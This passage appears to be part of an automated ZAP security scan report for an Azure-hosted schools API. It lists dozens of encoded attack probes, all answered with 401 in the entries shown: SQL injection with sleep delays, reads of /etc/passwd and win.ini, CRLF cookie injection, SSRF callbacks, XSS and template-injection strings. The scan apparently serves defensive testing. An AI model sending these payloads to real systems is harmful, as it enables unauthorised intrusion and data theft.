  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10+AND+1%253D2+--+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10+and+exists+%2528+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527%2529+--+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10+and+exists+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+--+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10+or+0+in+%2528select+sleep%252815%2529+%2529+--+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10+OR+1%253D1+--+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10+UNION+ALL+select+NULL+--+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10+where+0+in+%2528select+sleep%252815%2529+%2529+--+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=100W45pz4p&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=12-2&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=13-2&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=20%252F2&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=40%252F2&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=5%253BURL%253D%2527https%253A%252F%252F980414377652208366.owasp.org%2527&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=6u0ytx1orqv2f07wqhw9ene0qb8hyx9v0tlioza1y1dku5hp26v66t1o&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=980414377652208366.owasp.org&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=any%250ASet-cookie%253A+Tamper%253D08e6eae0-ec62-49e3-95ac-97e753f36ba6&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=any%250D%250ASet-cookie%253A+Tamper%253D08e6eae0-ec62-49e3-95ac-97e753f36ba6%250D%250A&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=any%250D%250ASet-cookie%253A+Tamper%253D08e6eae0-ec62-49e3-95ac-97e753f36ba6&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=any%253F%250ASet-cookie%253A+Tamper%253D08e6eae0-ec62-49e3-95ac-97e753f36ba6&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=any%253F%250D%250ASet-cookie%253A+Tamper%253D08e6eae0-ec62-49e3-95ac-97e753f36ba6%250D%250A&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=any%253F%250D%250ASet-cookie%253A+Tamper%253D08e6eae0-ec62-49e3-95ac-97e753f36ba6&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=c%253A%252F&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=c%253A%252FWindows%252Fsystem.ini&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=c%253A%255C&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=c%253A%255CWindows%255Csystem.ini&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=case+randomblob%2528100000%2529+when+not+null+then+1+else+1+end+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=case+randomblob%25281000000%2529+when+not+null+then+1+else+1+end+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=case+randomblob%252810000000%2529+when+not+null+then+1+else+1+end+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=case+randomblob%2528100000000%2529+when+not+null+then+1+else+1+end+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=case+randomblob%25281000000000%2529+when+not+null+then+1+else+1+end+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+--+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=cat+%252Fetc%252Fpasswd&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=get-help&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=http%253A%252F%252F%255C980414377652208366.owasp.org&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=http%253A%252F%252F980414377652208366.owasp.org&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=http%253A%252F%252Fwww.google.com%252F&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=http%253A%252F%252Fwww.google.com%252Fsearch%253Fq%253DZAP&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=http%253A%252F%252Fwww.google.com%253A80%252F&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=http%253A%252F%252Fwww.google.com%253A80%252Fsearch%253Fq%253DZAP&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=http%253A%252F%252Fwww.google.com&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=https%253A%252F%252F%255C980414377652208366.owasp.org&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=https%253A%252F%252F980414377652208366%25252eowasp%25252eorg&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=https%253A%252F%252F980414377652208366.owasp.org&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=iyyv91xpz7ex4wgsutok2xx5gs3tdo0wl8d4t1866s35sewdg3hhvp09ke&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=javascript:alert(1&29&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=JqGJsKZxSFPkAONLYpEGEaIBDYkHOPpnmZEndhWcsgVjfQJcLcnZopOWKZAvwnbHaXwiueeXxaNcXUmywdihdKnRfRhgvUbnTjWNHjUrXPJtrZguCkaUUHWeilOLVymwQfPtUitoboprmvorBiagOtNUROmPHlTPtRxoFEbHEfYhKheUNeXDalbswCNYXLlXIOIioZdWRoMBgfsYArEiolgYyppxyIqDWoYCZMnJqIOAyvFcNkEOleQmkJXJDphkylwJWXLnuOftskSIbYONEsNfSAWrXmNijJZmqorSctZbaJQGGlSRnGddhSWpDrIBCkuMwtpmnKpGviDToLXVmHCjsNKdUaCTMkutVcaoiHAqwswJAklhXkPTZODUBQMWIoRcrbVsIdhgkYwISNjRYFNhbxhRENBHMxUxZKMdVArhlwIHCYvoEXbxBmVDKSnMCfjZyQWKfTHahviWmmowAQSJjxdOaPrrVCmeFfygLApHYdtgkfrmnRhQdBshycgUfefVgtpqxEjXFAyRFbrYNWJMmnlQrxpuIZYcxJOdmPBIZBDTYKxJphOITONRVGMpEMDPVCcnbVnRpxlEGwEPAgYEayegeFmJwjGyZoekfESaFvotkDVPAeAHSAGaciNcUjOrtFXpuFYtGBvfTpkjEVKQPKUmtwNqcscVCgXhAorSlIhhOmCcfHBdTIlIcFxNMGWLlIjiHdACJpFXyhNkGPNJgoSUFEGRLwOTLVnaXmnLprNEfZQXoZcdEiaBcpTEsPHqMwwFFsFQAbGBVOZiSbfAqckLtEWPfLAMvLwyPgqliwZLlXXdIjpYBkpdobJWGGKwjqddalmJsWbPYglvBGvCYAZeOFEngEpRrQqrwpGlrKmIwuRkKhRsHNPeZUAKTVYldTTYThpZaQdDRYkonpdXDKWvbnRKSgoqeMsbJIJMtwnCIhBfchvFtNAXVQypqwdkyPRQuYXLqVlUxNhEqHsRcIiSlXcNWbeJFcrSCKfHcWqkTLDyMiUqVYOEmLsgyjJkDGEuZCyyikLtHKnrDmISBBuHDFYMkCobkVwlGLvmZtShfVlNHkrRJWOTiymVyKrFpMSgSDMarYAvDXEZtRtNqqMetgUbfIcClsrrDXpVeieYatDjFQOEPUxwhRSBZKpELnNVkHSXSpUAnWyqEDuFQkHFhfjBBktePTijUTUTuABhynJcTgZAgYhdAGLTEKtlHfDnjmLrKsSZRDiQKZihmQHlGrFgaIkVDdMrHwvEYMjFktsXFLfpvANHmFKJfVNrApBpDkosnwFugLRiMdRWxEGXpLiPojfDkwNxSphjinqNGRqkwFHrBtLkjHAGMQjbgRqspTVYCkpsccDRBCUyAvedeMeHkTFitZQUcyKaXPQblVPvXOEoYLNfvIQvpVHKQpMGpMgNyJvKuLlDeeymqbySUaieiHWmUvwwknbugAgtCmFwCFOWtAsfMdHmxLNirtHFHfSCYZoenIBUoaTwPWYGDYLGdQVZqQIqmRugtyoynTRwXLpfLXLaMSOAYqvOpwnShcWTiuiqXLSBFCZpAyTSkyKVQeQxmSBHkPDHVSDLqSGHIveRVTBcKUwUceUZHnIJpRduIvQsPCDjkXMDkPHaMTiRSSlmDcvglLcOSajqkKbQCUBJpqOAqyjwmRQXjmOmXCIknNvOOVyELQjpbcqnwcsYNlmWkgWhVUHnkUixVimhwmNGOChOrVPQFPvXffqogBWHWFDEiuiLfqBiMCdTgGbLLQZtOcFAvmhKRvMbjwbHIBBoTHAJgLPRAewmhTKMpcDFFwsNBxFWCAhoIyXgpZwFuIeObopYSBUhSVmRYvaWWZxEEJyWqpXnriGCpcHaeMgYYqqTGHYIFYdcDCSGrsjwxOUsJWBGUrqDmjVZFqvAjYdhArKUYkHOkbqNDwbwMKyhCMZlRtWMGBEdCIHrkbBIYfmnkPlWHUMuaNDbkcTwgrCDshUfnhoqURXJWdpenastUJAlIrHedKsNDZoTWZlAbAbwZyNKacdnGmTtLZHFADswaZxklPlOhgHCLWHAqJXJpjVhbmHQynvMrfLtZAEpZTJkDKKCvjNUEZWYspHD&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=response.write%2528345%252C117*633%252C582%2529&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=schools&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=Set-cookie%253A+Tamper%253D08e6eae0-ec62-49e3-95ac-97e753f36ba6&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=system-property%2528%2527xsl%253Avendor%2527%2529%252F%253E&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=thishouldnotexistandhopefullyitwillnot&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=type+%2525SYSTEMROOT%2525%255Cwin.ini&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=URL%253D%2527http%253A%252F%252F980414377652208366.owasp.org%2527&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=WEB-INF%252Fweb.xml&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=WEB-INF%255Cweb.xml&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=www.google.com%252F&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=www.google.com%252Fsearch%253Fq%253DZAP&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=www.google.com%253A80%252F&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=www.google.com%253A80%252Fsearch%253Fq%253DZAP&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=www.google.com&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=ZAP%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%250A&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=ZAP&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=ZAP+%25251%2521s%25252%2521s%25253%2521s%25254%2521s%25255%2521s%25256%2521s%25257%2521s%25258%2521s%25259%2521s%252510%2521s%252511%2521s%252512%2521s%252513%2521s%252514%2521s%252515%2521s%252516%2521s%252517%2521s%252518%2521s%252519%2521s%252520%2521s%252521%2521n%252522%2521n%252523%2521n%252524%2521n%252525%2521n%252526%2521n%252527%2521n%252528%2521n%252529%2521n%252530%2521n%252531%2521n%252532%2521n%252533%2521n%252534%2521n%252535%2521n%252536%2521n%252537%2521n%252538%2521n%252539%2521n%252540%2521n%250A&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=zApPX53sS&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=zj%2523%257B2602*9567%257Dzj&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=zj%2523set%2528%2524x%253D7427*6238%2529%2524%257Bx%257Dzj&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=zj%2524%257B4631*1505%257Dzj&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=zj%253C%2525%253D4783*8321%2525%253Ezj&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=zj%253Cp+th%253Atext%253D%2522%2524%257B8063*5934%257D%2522%253E%253C%252Fp%253Ezj&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=zj%257B%25233806*7314%257Dzj&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=zj%257B%25406513*3794%257Dzj&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=zj%257B%2540math+key%253D%25227592%2522+method%253D%2522multiply%2522+operand%253D%25228971%2522%252F%257Dzj&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=zj%257B%257B%253D2499*6538%257D%257Dzj&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=zj%257B%257B5289*8484%257D%257Dzj&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=zj%257B%257B79160%257Cadd%253A29530%257D%257Dzj&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=zj%257B%257Bprint+%25228029%2522+%25226686%2522%257D%257Dzj&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=zj%257B9115*9857%257Dzj&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=zj+9871*7613+zj&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber+%252F+%2522java.lang.Thread.sleep%2522%252815000%2529+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber+%252F+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
